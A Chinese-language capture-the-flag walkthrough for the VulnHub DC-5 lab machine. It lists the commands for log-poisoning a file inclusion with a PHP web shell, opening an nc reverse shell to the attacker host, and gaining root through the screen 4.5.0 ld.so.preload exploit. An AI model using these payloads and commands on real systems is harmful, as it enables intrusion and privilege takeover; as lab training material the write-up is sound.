# Vulnhub靶场攻略：DC-5

**项目介绍**  

VulnHub是一个面向所有人开放的黑客游戏靶场练习平台，里面有好多锻炼黑客技术，学习黑客技术的游戏虚拟机供所有人下载攻打，里面大部分靶场主机都是需要控制虚拟机，获得主机的最高权限才算挑战成功，只要下载相关镜像，在相关虚拟机软件上面运行就可以进行游戏了。

**游戏目标**

本次靶场名为DC-5，整个系列共九个环境，今天玩第五个，本次目标只有一个root目录下的flag需要获得，要注意的是没有任何提示，所以就通过自己掌握的能力进行渗透练习。

**环境搭建**

1、官网下载连接：https://www.vulnhub.com/entry/dc-5,314/

2、下载之后，使用Oracle VM VirtualBox导入靶场环境

3、为了正常练习，将靶场的网卡模式设置为桥接模式，启动即可

![](../Images/596eb269139153ca0849c33ac2d04227.png)**靶机攻略**

1、依照惯例，使用命令：nmap -sP --min-hostgroup 1024 --min-parallelism 1024 10.10.114.0/24，快速探测存活主机，找到靶场ip

![](../Images/8ab76663afbf6e63bacafbc9a7378de2.png)2、探测靶场启动的服务，使用命令：nmap -A- -p 10.10.114.216，发现开启了80和111端口，111端口没查到有可以利用的点，还是从80端口寻找突破口

![](../Images/f4cddbf6670b96908458983fb5368bed.png)3、访问靶场80端口，在http://10.10.114.216/contact.php页面，发现了交互地方，提交之后，每次刷新，下方时间会变化

![](../Images/1d66b4f4da5ba40061f74004588bea36.png)

![](../Images/52f68b964321c943f23051f2198ff380.png)4、 猜测，下边月份显示可能是调用文件之后返回数值，所以尝试使用包含，发现成功文件包含

![](../Images/3b2d29e86783f40e0c28a5d36fb76ecc.png)5、通过浏览器插件，知道HTTP使用的中间件有Nginx

![](../Images/f8fdb1fb65e5217dcd98818139457fa6.png)6、查询到nginx配置文件路径，包含过来查看

![](../Images/6935a22c445685cd5c43137e7c172b4f.png)读取nginx配置文件信息，发现nginx日志记录文件路径

![](../Images/f5584a29ec99daed1f7c3a8f31f9e206.png) 在日志中，发现所有的访问记录，都会被记录，没有转码啥的

![](../Images/602b29669a4e2fc64bfb53d90c8c9d19.png)7、既然所有都明文传输被解析，那就利用这个特性，传入一句话，并让他解析出来

打开Burpsuite，抓包修改file参数，传入一句话file=<?php system($\_GET\['x'\]) ?>

![](../Images/241d04cae2d42899f1a2911396f8fc0d.png)在进行包含nginx的错误日志，利用一句话

![](../Images/3f886b3fc43899f90a35d7f40b88b53d.png)8、利用一句话，反弹shell

在kali使用nv监听端口，然后一句话传入：nc -e 10.10.114.186 2345，成功接收到shell

![](../Images/d71f0f93396889e634df89da7a3296e4.png)使用命令：python -c "import pty;pty.spawn('/bin/bash')"，接收交互式shell

![](../Images/5bb5384a46c0a1237c00e9b0b0987dec.png)9、下一步进行提权，使用命令：find / -user root -perm -4000 -print 2>/dev/null，查找是否有可利用的suid，发现screen-4.5.0

![](../Images/389f15fd986a3cd6d53723ccafb94187.png)10、利用searchsploit screen 4.5.0找到了利用的文件![](../Images/85635b315f4d857d5caf0de09b1008e1.png)

 查看41154.sh，发现提权方法

![](../Images/4273e5e7f0fbe92567c7003d5edff933.png)11、根据使用说明，创建两个文件libhax.c和rootshell.c，之后使用gcc进行编译

gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c

gcc -o /tmp/rootshell /tmp/rootshell.c

![](../Images/bf3dfb0b9f74b7bfb50f0d665c11e252.png)12、利用nc的管道，将编译好的文件传输过去

kali攻击机使用命令:nc -nlvp 4567 < libhax.so

靶场使用命令:nc 10.10.114.186 4567 > libhax.so，连接之后kali断开即可

kali攻击机使用命令:nc -nlvp 4567 < rootshell

靶场使用命令:nc 10.10.114.186 4567 > rootshell，连接之后kali再次断开即可

![](../Images/45b15eaa571db24e1aa569bef9e3c81d.png)13、根据提权说明，使用方法

首先输入命令：cd /etc

然后输入命令：umask 000

然后输入命令：screen -D -m -L ld.so.preload echo -ne  "\\x0a/tmp/libhax.so"

然后输入命令：screen -ls

最后输入命令：/tmp/rootshell，成功提权

![](../Images/977b97dc61bf1caebb23ba7285f08835.png)最后在root目录下，得到flag

![](../Images/369b81e2f8cac93f42cb4edcddbf62d1.png)
